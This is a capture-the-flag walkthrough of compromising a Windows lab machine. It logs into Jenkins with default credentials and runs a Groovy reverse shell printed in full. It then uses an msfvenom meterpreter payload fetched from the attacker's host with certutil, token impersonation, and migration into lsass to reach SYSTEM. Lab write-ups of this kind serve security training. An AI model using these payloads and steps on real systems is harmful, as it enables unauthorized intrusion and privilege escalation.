Starting off with deploying the machine and quickly scanning the open ports with rustscan,

```bash
rustscan -a 10.10.183.220 --ulimit 5000
```

We got the open ports and now we can scan them in detail using nmap,

```bash
nmap -sC -sV -p80,3389,8080 10.10.183.220 -oN nmap.log
```

Result scan shows that port 80 is running Microsoft IIS server, port 3389 is running some unknown service and port 8080 is running webserver with Jetty service installed. 

Let's begin enumeration with port 80 by visiting http://10.10.183.220,

![image](https://user-images.githubusercontent.com/67465230/187151845-7dd42e0f-0215-4e7a-b5d8-ff094cd1eae4.png)

we landed on the webpage where we can see the picture of Bruce Wayne and below it, we can see the email id associated with the last name of the Bruce Wayne. 

But after looking around, checking its source code, I couldn't found anything so I decided to enumerate port 8080.

Let's visit http://10.10.183.220:8080,

![image](https://user-images.githubusercontent.com/67465230/187152278-42a8ecbc-24c4-40e1-9cdb-7c135412b050.png)

we found a Jenkins login page. 

From here, we can try to brute force user credentials to gain access to the panel but since this box is pretty straight forward, I tried admin:admin credentials and was successful in getting into admin panel,

![image](https://user-images.githubusercontent.com/67465230/187152365-15d225ee-683d-4411-a7ce-b135549665ec.png)

so we got into admin panel and here we can see the dashboard where we can add new item, see the build history, manage jenkins, etc. 

After enumerating the panel, I counter a tab name **Manage Jenkins** where we can get into **Script Console**, having the functionality where we can run the Groovy script (or *commands maybe*),

![image](https://user-images.githubusercontent.com/67465230/187156058-6067beb3-0385-4d41-aaa0-f13a77563382.png)

So we can copy the [Groovy Reverse Shell](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) and paste it into the console, 

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Let's start the netcat listener using `nc -nvlp 4444` and hit the run button on the console and we'll get a reverse shell,

![image](https://user-images.githubusercontent.com/67465230/187156100-17d5ef93-606e-4a8b-8c0e-bab1c873c4e0.png)

Now, that we know that we're bruce user, we can navigate to Desktop directory and get the flag,

![image](https://user-images.githubusercontent.com/67465230/187156150-b7ae58d2-2756-44fb-806b-839dabf4d947.png)

Now, that we got the flag, we can now generate a malicious payload using `msfvenom` and catch the connection with metasploit handler. So let's generate a payload,

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.3.171 LPORT=5555 -f exe -o cat.exe
```

![image](https://user-images.githubusercontent.com/67465230/187156192-44f1d131-8d6f-4c58-a6ec-7b4726afcd55.png)

our payload gets generated. 

Now, start the server using `python3 -m http.server` and now we can transfer the payload using `certutil` command to target machine, 

```bash
certutil -urlcache -f http://10.9.3.171:8000/cat.exe cat.exe
```

![image](https://user-images.githubusercontent.com/67465230/187156653-887806c6-dd23-4a28-8270-2ac6bce5ae5f.png)

our payload is transferred successfully.

Now, we can setup metasploit multi/handler to catch reverse shell,

```bash
msfconsole -q
use exploit/multi/handler
set LHOST tun0
```

![image](https://user-images.githubusercontent.com/67465230/187156749-34584351-a774-480a-8810-91de28a51481.png)

Let's run the listener using `run` command and then fire up the exploit using cat.exe and we'll get the meterpreter session opened for us,

![image](https://user-images.githubusercontent.com/67465230/187156822-b6297adc-6f8f-4112-9fd3-65b67b225d64.png)

Now that we have meterpreter shell, we have much more functionality as meterpreter shells are tend to be more stable and supports many in-built commands. 

Now, let's check the current privileges we have using `getprivs` command,

![image](https://user-images.githubusercontent.com/67465230/187156887-aada2ff3-9d71-4ab3-bdd2-dcd46ef1a8f6.png)

we got the list of privileges but here we can see the **SeImpersonatePrivilege** privilege which stands out the most important to us as by abusing this, we can impersonate use as SYSTEM user.

In this challenge, we'll be looking at `incognito` command, *which allows us to impersonate user tokens when successfully compromising a system*. So let's load the incognito mode in meterpreter using, 

```bash
load incognito
```

![image](https://user-images.githubusercontent.com/67465230/187156949-6b62ec19-4abf-4249-ad87-b361c53635e1.png)

Now, we can list all the available tokens of the group,

```bash
list_tokens -g
```

![image](https://user-images.githubusercontent.com/67465230/187157001-d7d28dc0-76e1-433e-ab73-bd58ce259d4b.png)

we can see that there are many tokens available but BUILTIN\Administrators token is useful so let's use it.

Impersonating with BUILTIN\Administrators token,

```bash
impersonate_token "BUILTIN\Administrators"
```

![image](https://user-images.githubusercontent.com/67465230/187157040-fefc4a54-f0fc-4807-a14a-a2574b4aa4db.png)

we have successfully impersonated as NT AUTHORITY\SYSTEM user. 

Now if try to dump hashes using `hashdump` command, hashes won't get dump because even if we have become NT AUTHORITY\SYSTEM user, we still not have permissions to dump the hashes. 

So we can do one thing is that we can migrate to the process which is running as NT AUTHORITY\SYSTEM user. So listing processes using `ps` command, 

![image](https://user-images.githubusercontent.com/67465230/187157096-c3a551f8-d61c-458f-adef-7c6142282295.png)

we can see the lsass.exe service which is running as NT AUTHORITY\SYSTEM user which has PID equals 676.

So we can try to migrate our current process to PID 676, 

```bash
migrate 676
```

![image](https://user-images.githubusercontent.com/67465230/187157147-12dcea54-4697-4f13-b3ba-b980273efbc8.png)

with this command, we have successfully migrated to other process and have retain the privileges as NT AUTHORITY\SYSTEM user.

Now, let's drop into the `shell` and issuing `whoami` command and we got to know that we are NT AUTHORITY\SYSTEM user,

Navigating to **C:\Windows\System32\Config** and we can see the root.txt file, 

![image](https://user-images.githubusercontent.com/67465230/187157267-bb5bf501-ef94-49e5-88df-16d04d5cae33.png)
